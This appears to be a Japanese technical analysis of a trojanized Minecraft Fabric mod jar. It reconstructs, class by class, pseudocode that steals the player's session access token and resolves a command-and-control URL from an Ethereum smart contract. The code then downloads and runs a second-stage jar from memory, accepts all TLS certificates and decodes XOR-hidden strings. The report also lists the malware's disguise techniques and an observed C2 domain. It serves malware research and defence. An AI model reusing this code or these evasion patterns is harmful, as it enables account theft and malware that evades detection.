# 技術解析

`MoneyDupeXLimit-1.2.jar` の詳細解析。第二段階 `Module.jar` の解析は [second_stage.md](second_stage.md) を参照。

## ファイル構造

```
MoneyDupeXLimit-1.2.jar
├── META-INF/
│   └── MANIFEST.MF                    ← Main-Class: dev.impl.LayoutService ★
├── fabric.mod.json                    ← entrypoint: dev.impl.SpecRenderer ★
├── LICENSE_examplemod                 ← Fabric example mod の偽装
├── assets/
│   └── ref_upper.dat                  ← 72,704 bytes 暗号化リソース
└── dev/impl/
    ├── SpecRenderer.class             ← Fabric MOD エントリ
    ├── LayoutService.class            ← スタンドアロン Main
    ├── InternalWrapper.class          ← 第二段階ローダー
    ├── RegistrySelector.class         ← ETH コントラクト C2 解決
    ├── ExampleMixin.class             ← 自作 ClassLoader
    ├── UnusedStack.class              ← DoH + 生 SSLSocket
    ├── UnusedStack$1.class            ← 全証明書受理 TrustManager
    ├── UnusedStack$2.class            ← 同上
    ├── UnusedStack$CacheEntry.class
    └── sweepMethod.class              ← XOR 文字列復号器
```

## クラス別解析

### `dev.impl.SpecRenderer` (Fabric MOD エントリ)

**役割**: Minecraft 起動時に Fabric Loader から `onInitialize()` を呼ばれる第一実行点。

**疑似コード**:
```java
public void onInitialize() {
    System.out.println(decode("Mod init state: M0"));

    MinecraftClient mc = MinecraftClient.getInstance();
    Session session = mc.getSession();

    String username = session.getUsername();           // method_1676
    String uuid     = session.getUuidOrNull().toString(); // method_44717
    String token    = session.getAccessToken();        // method_1674

    String json = String.format(
        "{\"username\":\"%s\",\"uuid\":\"%s\",\"accessToken\":\"%s\"," +
        "\"minecraftInfo\":\"17c1db77-cc87-4783-88d1-7ceca88d88c5\"}",
        username, uuid, token
    );

    InternalWrapper.openModel(json);
}
```

**Yarn マッピングから判明したメソッド**:

| Yarn obfuscated | 実メソッド |
|---|---|
| `class_310.method_1551` | `MinecraftClient.getInstance` |
| `class_310.method_1548` | `MinecraftClient.getSession` |
| `class_320.method_1676` | `Session.getUsername` |
| `class_320.method_44717` | `Session.getUuidOrNull` |
| `class_320.method_1674` | `Session.getAccessToken` |

### `dev.impl.LayoutService` (スタンドアロン Main)

**役割**: jar をダブルクリックや `java -jar` で起動した場合のエントリ。

**判明している動作**:
1. `executionEnvironment: "DoubleClick"` のタグを付ける
2. `java.home` から `bin/javaw.exe` のパスを構築
3. `ProcessBuilder` で自分自身を別プロセスとして再起動

```java
public static void main(String[] args) {
    String jh = System.getProperty("java.home");
    String javaw = jh + File.separator + "bin" + File.separator + "javaw.exe";
    String jarPath = LayoutService.class.getProtectionDomain()
                         .getCodeSource().getLocation().toURI().getPath();

    new ProcessBuilder(javaw, "-jar", jarPath).start();
    InternalWrapper.openModel(
        "{\"executionEnvironment\":\"DoubleClick\"," +
        "\"userId\":\"17c1db77-cc87-4783-88d1-7ceca88d88c5\"}"
    );
}
```

**MANIFEST.MF**:
```
Manifest-Version: 1.0
Main-Class: dev.impl.LayoutService    ← ★ ダブルクリック時のエントリ
Fabric-Jar-Type: classes
Fabric-Loom-Mixin-Remap-Type: static
...
```

つまり**同じjarが Fabric MOD としても、独立した実行可能 jar としても動作する二刀流構成**。

### `dev.impl.InternalWrapper` (第二段階ローダー)

**役割**: Ethereum コントラクトから C2 URL を引き、第二段階 jar をダウンロードして動的ロード・実行する。

**疑似コード**:
```java
public static void openModel(String contextJson) {
    try {
        // 1. ETHコントラクトから現在のC2ベースURLを取得
        String baseUrl = RegistrySelector.atomicRange(
            "0x1280a841Fbc1F883365d3C83122260E0b2995B74"
        );

        // 2. /files/jar/module を付けて第二段階jarをダウンロード
        String url = baseUrl + "/files/jar/module";
        byte[] jarBytes = httpGet(url);

        // 3. JarInputStream で展開、クラスとリソースのMapを作る
        Map<String, byte[]> classDefs = new HashMap<>();
        Map<String, byte[]> resourceDefs = new HashMap<>();
        try (JarInputStream jis = new JarInputStream(
                 new ByteArrayInputStream(jarBytes))) {
            JarEntry e;
            while ((e = jis.getNextJarEntry()) != null) {
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                jis.transferTo(baos);
                if (e.getName().endsWith(".class")) {
                    classDefs.put(
                        e.getName().replace(".class","").replace('/','.'),
                        baos.toByteArray()
                    );
                } else {
                    resourceDefs.put(e.getName(), baos.toByteArray());
                }
            }
        }

        // 4. 自作 ClassLoader でメモリから直接ロード
        ExampleMixin loader = new ExampleMixin(classDefs, resourceDefs);
        Class<?> mainClass = loader.loadClass("dev.majanito.Main");
        Object instance = mainClass.getDeclaredConstructor().newInstance();

        // 5. リフレクションで dev.majanito.Main.initializeWeedhack を別スレッド実行
        Method m = mainClass.getMethod("initializeWeedhack",
                                       String.class);  // contextJson 渡す
        new Thread(() -> m.invoke(instance, contextJson)).start();

    } catch (Exception ignored) {}
}
```

**ステートログ**: クラス内に `Resource state: S2`〜`Resource state: S7` というデバッグ文字列が残る（XOR で難読化されている）。

### `dev.impl.RegistrySelector` (ETH コントラクト C2 解決)

**役割**: 公開 Ethereum RPC 経由でスマートコントラクトを `eth_call` し、戻り値を RSA 署名検証して現在の C2 URL を取得する。

**疑似コード**:
```java
public static String atomicRange(String contractAddr) {
    String[] rpcs = {
        "https://eth.api.onfinality.io/public",
        "https://ethereum-rpc.publicnode.com",
        // ...全 17 本のフォールバック...
        "https://1rpc.io/eth"
    };

    String selector = "0xce6d41de";   // read-only function selector

    for (String rpc : rpcs) {
        try {
            // JSON-RPC リクエスト構築
            String body = String.format(
                "{\"jsonrpc\":\"2.0\",\"method\":\"eth_call\"," +
                "\"params\":[{\"to\":\"%s\",\"data\":\"%s\"},\"latest\"]," +
                "\"id\":1}", contractAddr, selector
            );

            String resp = httpPost(rpc, body, "application/json");
            // resp = {"jsonrpc":"2.0","id":1,"result":"0x..."}

            String hex = extractResult(resp);
            // ABI デコード: [offset(32)][length(32)][data(length)]
            byte[] decoded = abiDecodeString(hex);
            String payload = new String(decoded, UTF_8);
            // payload = "<URL>|<base64 RSA署名>"

            int sep = payload.indexOf('|');
            String url  = payload.substring(0, sep);
            String sig  = payload.substring(sep + 1);

            // RSA-SHA256 で URL を検証
            if (verifyRsaSha256(url, sig, EMBEDDED_PUBKEY)) {
                return url;
            }
        } catch (Exception e) { /* try next */ }
    }
    throw new RuntimeException("No result");
}
```

**埋め込みRSA公開鍵**: 2048bit, [IOCS.md](IOCS.md#url-署名検証用-rsa-公開鍵-pkcs1-2048bit) 参照。

**観測時の戻り値** (2026/04/08):
```
https://whreceiverrrrrrrrr.ru|lW1y194aj29HHnbLK5RqTZ4vRzaDR7U/uk+Emu6L+4Bf3xfOgbzs...
```

### `dev.impl.ExampleMixin` (自作 ClassLoader)

**役割**: メモリ上の `Map<String, byte[]>` からクラスとリソースを供給する。第二段階のディスクレス実行を実現。

```java
public class ExampleMixin extends ClassLoader {
    private final Map<String, byte[]> classDefinitions;
    private final Map<String, byte[]> resourceDefinitions;

    public ExampleMixin(Map<String, byte[]> classes,
                        Map<String, byte[]> resources) {
        super(ClassLoader.getSystemClassLoader());
        this.classDefinitions = classes;
        this.resourceDefinitions = resources;
    }

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        byte[] b = classDefinitions.get(name);
        if (b == null) throw new ClassNotFoundException(name);
        return defineClass(name, b, 0, b.length);
    }

    @Override
    public InputStream getResourceAsStream(String name) {
        // 第二段階の Main がリソース要求してきたら map から返す
        if (name.startsWith("/")) name = name.substring(1);
        byte[] b = resourceDefinitions.get(name);
        return b != null ? new ByteArrayInputStream(b) : null;
    }
}
```

クラス名は Fabric の例にある `ExampleMixin` を流用。**完全に偽装名**で、本来 Mixin とは何の関係もない。

### `dev.impl.UnusedStack` + `$1` + `$2` + `$CacheEntry` (DoH + 生TLS)

**役割**: DNS over HTTPS で名前解決し、生 SSLSocket で SNI を偽装して TLS 通信する。

**重要な仕掛け**: `UnusedStack$1` と `UnusedStack$2` は **`X509TrustManager` の checkClientTrusted / checkServerTrusted を空実装** している。
つまり**全ての証明書を無条件で受理**する。企業の TLS インスペクション (中間者復号) を完全にバイパス。

```java
private static final TrustManager[] TRUST_ALL = new TrustManager[] {
    new X509TrustManager() {
        public void checkClientTrusted(X509Certificate[] c, String s) {}
        public void checkServerTrusted(X509Certificate[] c, String s) {}
        public X509Certificate[] getAcceptedIssuers() { return null; }
    }
};
```

DNS 解決は 3 つの DoH エンドポイントを試す:
- `https://cloudflare-dns.com/dns-query?name=%s&type=A`
- `https://1.1.1.1/dns-query?name=%s&type=A`
- `https://dns.google/resolve?name=%s&type=A`

`ConcurrentHashMap` でレスポンスをキャッシュ (`UnusedStack$CacheEntry`)。

### `dev.impl.sweepMethod` (XOR 文字列復号器)

**役割**: 全難読化文字列の復号を司る。

```java
public class sweepMethod {
    public static String atomicRange(String hex) {
        try {
            byte[] b = hexToBytes(hex);
            int key = b[0] & 0xFF;
            StringBuilder sb = new StringBuilder();
            for (int i = 1; i < b.length; i++) {
                sb.append((char)((b[i] & 0xFF) ^ key));
            }
            return new String(sb.toString().getBytes(), StandardCharsets.UTF_8);
        } catch (Exception e) {
            return "";
        }
    }
}
```

**復号アルゴリズム**: 16進文字列 → バイト列 → 先頭バイトをXORキーとして残りを復号 → UTF-8 文字列。

復号した全文字列の一覧は [decoded_strings.md](decoded_strings.md) 参照。

## 偽装の小技

| 偽装 | 内容 |
|---|---|
| クラス名 | `ExampleMixin`, `LayoutService`, `RegistrySelector`, `UnusedStack`, `sweepMethod` ── 全て無害そうな名前 |
| ファイル名 | `LICENSE_examplemod` ── Fabric example mod のライセンスをそのままコピー |
| パッケージ名 | `dev.impl.*` ── 一般的すぎて検索に引っかからない |
| ソースファイル名 | `ExampleMod.java`, `Helper.java`, `Entrypoint.java`, `FabricAdapter.java`, `CloudflareDNS.java` ── 平凡なファイル名 |
| `fabric.mod.json` | `homepage: https://fabricmc.net/`, `sources: https://github.com/FabricMC/fabric-example-mod` |
| フィールド名 | `connectorProcessor`, `mediatorPattern`, `volumePipeline`, `binaryWire`, `flatObserver` ── 意味のないランダムな単語の組み合わせ |
| 文字列 | 全て XOR + hex で難読化 |
